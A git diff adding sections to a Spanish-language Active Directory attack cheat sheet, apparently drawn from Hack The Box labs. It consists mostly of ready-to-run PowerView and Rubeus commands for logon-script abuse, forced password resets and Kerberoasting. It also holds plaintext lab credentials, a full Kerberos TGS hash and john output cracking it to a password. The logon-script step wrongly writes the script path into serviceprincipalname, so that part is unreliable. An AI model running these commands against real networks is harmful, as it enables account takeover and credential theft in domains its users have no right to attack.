@@ -82,6 +82,8 @@ result: 0 Success
 
 ## Abuso WriteOwner
 
+![image](https://rubbxalc.github.io/writeups/assets/img/Object-htb/14.png)
+
 ### Crear objeto y modificar las ACLs
 
 ```null
@@ -175,6 +177,24 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 *Evil-WinRM* PS C:\Users\sbauer\Documents> Get-AdUser jorden | Set-ADAccountControl  -doesnotrequirepreauth $true
 ```
 
+### Modificar Loggon Scripts
+
+```null
+*Evil-WinRM* PS C:\Temp> Import-Module .\PowerView.ps1
+*Evil-WinRM* PS C:\Temp> echo "dir C:\Users\Maria\Desktop\ > C:\Temp\output.txt" > cmd.ps1
+*Evil-WinRM* PS C:\Temp> Set-DomainObject -Identity maria -SET @{serviceprincipalname='C:\Temp\cmd.ps1'}
+```
+
+## Abuso ForceChangePassword
+
+### Modificar credenciales a otro usuario
+
+```null
+*Evil-WinRM* PS C:\Temp> Import-Module .\PowerView.ps1
+*Evil-WinRM* PS C:\Temp> $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+*Evil-WinRM* PS C:\Temp> Set-DomainUserPassword -Identity smith -AccountPassword $SecPassword
+```
+
 ## Abuso de DCSync
 
 ### Dumpear NTDS
@@ -192,4 +212,82 @@ PS C:\Temp> Invoke-Whisker -Command "add /target:sflowers"
 ```
 
 Se ejecutará el Rubeus para obtener un hash NTLM y hacer PassTheHash
+
+### Abuso Kerberoasteable
+
+![image](https://rubbxalc.github.io/writeups/assets/img/Sizzle-htb/10.png)
+
+### Con Rubeus
+
+```null
+*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> .\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target Domain          : HTB.LOCAL
+[*] Searching path 'LDAP://sizzle.HTB.LOCAL/DC=HTB,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 1
+
+
+[*] SamAccountName         : mrlky
+[*] DistinguishedName      : CN=mrlky,CN=Users,DC=HTB,DC=LOCAL
+[*] ServicePrincipalName   : http/sizzle
+[*] PwdLastSet             : 7/10/2018 2:08:09 PM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle@HTB.LOCAL*$46942998ACECC61F85DF0D44E6DB
+                             FBB8$E3F2F615F33DF2F9F06ADD37A8A249B052980073527353B8A7CB98B40C4615FBDC4A3854BAB
+                             682BA0607C8D1B239E41D53C2C29317343183AF26A2165F06DFFB7B5CC293B73AED9E34F725E2EC5
+                             EDD3852812EF12A6E47386DC3AA20A7685519670D44308E9CA47D27411668E9EDDE7625E1B333DD9
+                             3653F974C18FD51BB9D8B76D53C814BB4266E7686B5D4AA10A8B3F0116D335DF1EDCE4EB49CC4FBC
+                             B5CB6B79DECD4CF5CC67BB98340B642F1BD7450269F874093F17C60DE0A741F6F112E565FD3A615E
+                             3EDFC42E58C8454F7CE6E7C9B6415011A70BB378D5FD2A060B5435F11F0444DA63E963C3DF92EFE3
+                             4456C968EB9FDF747A3E262F7472551C2825F3730F860F5396E46C71A2CA980624B5122561EE008C
+                             C5B0CCC7D12367EF4FB982B8836DC3B51A395E3B81997E0D7DF3DA5AEC4E873BE0F5C157B8D19B30
+                             C2B9DDCE93771BF8A70F3570DCB6CE8FD941AB2DA741B8B92C8210AD7704941CC1E085BFEA54196C
+                             47B3D251270FBB42CDC13A11CDEEBE473F00355CEF337E72B6ABD9C8197083EA2E19482FEF6EA9DD
+                             80586A8F28C68CEC0822A9112B2DD5342918C8B0F8E638C76BD0FF4357B6E951A544D60D617F606F
+                             434698D13B3BC0468B436078ACA89E4592C5B20BE9E63DACD25C0DE3D1C141AE3B93BE6D89E66A3E
+                             0C376A3B24814EA53B3FD570EA3E8A43845D4CBAFC8F63D8F2F14B5C280F4E7CE20EBDCA7ECE6DAB
+                             D9310B10F5B3ADDD80B31A1746AB91F35776D40DF01A143757E3F459A10EDE11869296C9893FB3D9
+                             80B10FA937EAAA33CD1E819CA08007C3C49650E7FCCC20115F6150AB3AEC875FC1B58427C1F7C630
+                             F2B1D37CCB9C04EC25CD18236EB07C78DCFA52AC4353DFF7C622576DE19134E7A34FF9ADBC16D209
+                             B50CC1D417E2889FAC37B40CA66A5E9CD326020CFB5BCD574A97511359A284E5856D7AA80F135786
+                             E57A243C5B7ED853EDF158157FF25F77124EA36F8E6D09FBE316A8FCD569CB0FEBEA67F0EB239C51
+                             7DE4F326B7F1E79F666F2D448AE3DB13CAA1B471EF8F4172ABBE3AD78E20F3E86998C5C0B36F3EB3
+                             46C4465C886DEDED3BCCC113B0CD4D2B6D331DBCB2D483887CA9195E46DE95DA6368D9F4834BA9D4
+                             B25AFF4BDE9FCFF7FE0D4487080CA35487DE4A4AB316492A6534EA7E5BACC67EA6893E1C2C154DBB
+                             2CDCB44E43C846A48533EAC21FDC38CF020B72DA506D2D2B2ACF2053DB2F82A699C07B29999E596D
+                             EEB3DF46DD18ED0BDDAAC3068DD84887D0248352D24F9F15A76C7AE9015408A18B67649A48B0D056
+                             4409DFC2B6695E083AAE400942508E4E6E1082505BBD6082F4185C110B5CBB596A2C426578609E69
+                             C02410F432981DD4B
+```
+
+#### Crack Hash
+
+```null
+john -w:/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Football#7       (?)     
+1g 0:00:00:05 DONE (2023-01-20 14:01) 0.1779g/s 1987Kp/s 1987Kc/s 1987KC/s Forever3!..Flubb3r
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
 
